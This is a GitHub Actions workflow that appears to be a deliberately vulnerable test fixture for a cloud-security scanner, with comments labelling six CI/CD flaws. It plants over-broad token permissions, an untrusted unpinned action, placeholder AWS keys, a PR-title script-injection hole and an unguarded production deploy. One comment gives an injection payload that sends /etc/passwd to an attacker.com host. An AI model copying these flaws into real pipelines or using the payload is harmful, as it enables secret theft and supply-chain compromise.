name: 🚨 Vulnerable CI/CD Pipeline
# =============================================================================
# .github/workflows/insecure-ci.yml – TigerGate CNAPP Test: CI/CD Vulnerabilities
# =============================================================================
# PURPOSE: Demonstrates CI/CD pipeline security misconfigurations.
#
# VULNERABILITY FINDINGS:
#   CI-001: Unverified/pinned third-party actions (supply chain attack vector)
#   CI-002: Hardcoded secrets in clear text (SonarQube: S6418)
#   CI-003: Command Injection via PR title interpolation (CWE-78)
#   CI-004: Privileged GITHUB_TOKEN with id-token:write (unnecessary permissions)
#   CI-005: Pull request scripts not sanitized (script injection)
#   CI-006: Deployment to production without approval gate
# =============================================================================

on:
  push:
    branches: [main, develop]
  pull_request:
    types: [opened, synchronize]

# 🔴 VULN: CI-004 – Over-privileged token grants all possible scopes
permissions:
  id-token: write
  contents: write
  pull-requests: write
  packages: write
  actions: write
  secrets: write   # 🔴 EXTREME: Pipeline can read/write all repository secrets!

jobs:
  # ---------------------------------------------------------------------------
  # 🔴 CI-001: Unverified/unpinned third-party GitHub Actions (supply chain)
  # ---------------------------------------------------------------------------
  sast-scan:
    name: SAST Scan (Unpinned Actions)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2           # 🔴 VULN: Not pinned to commit SHA
      - name: Run Unverified SAST tool
        uses: malicious-actor/fake-scanner@latest  # 🔴 VULN: Untrusted, unverified action!

  # ---------------------------------------------------------------------------
  # 🔴 CI-002: Hardcoded credentials in workflow
  # ---------------------------------------------------------------------------
  deploy-staging:
    name: Deploy to Staging
    runs-on: ubuntu-latest
    needs: sast-scan
    steps:
      - uses: actions/checkout@v2
      - name: Configure AWS
        # 🔴 VULN: Hardcoded AWS credentials in workflow — anyone with repo access sees this
        env:
          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
        run: |
          aws s3 sync ./dist s3://mega-corp-production-bucket --delete

  # ---------------------------------------------------------------------------
  # 🔴 CI-003: Script Injection via PR title interpolation
  # ---------------------------------------------------------------------------
  pr-comment:
    name: PR Comment (Script Injection)
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - name: Post review comment
        # 🔴 VULN: CI-005/CI-003 – PR title is user-controlled and injected directly
        # Payload: PR title = `"; curl https://attacker.com/$(cat /etc/passwd | base64); echo "`
        run: |
          echo "Reviewing PR: ${{ github.event.pull_request.title }}"
          echo "Submitter: ${{ github.event.pull_request.user.login }}"

  # ---------------------------------------------------------------------------
  # 🔴 CI-006: Direct deployment to production with NO approval gate
  # ---------------------------------------------------------------------------
  deploy-production:
    name: Deploy to PRODUCTION (No Approval!)
    runs-on: ubuntu-latest
    needs: deploy-staging
    # 🔴 VULN: Missing environment: { name: production, url: ... } with required reviewers
    steps:
      - uses: actions/checkout@v2
      - name: Deploy to Production
        run: |
          echo "Deploying ${{ github.sha }} to PRODUCTION..."
          # This would be a real deployment command (kubectl apply, helm upgrade, etc.)
          echo "No one approved this deployment!"
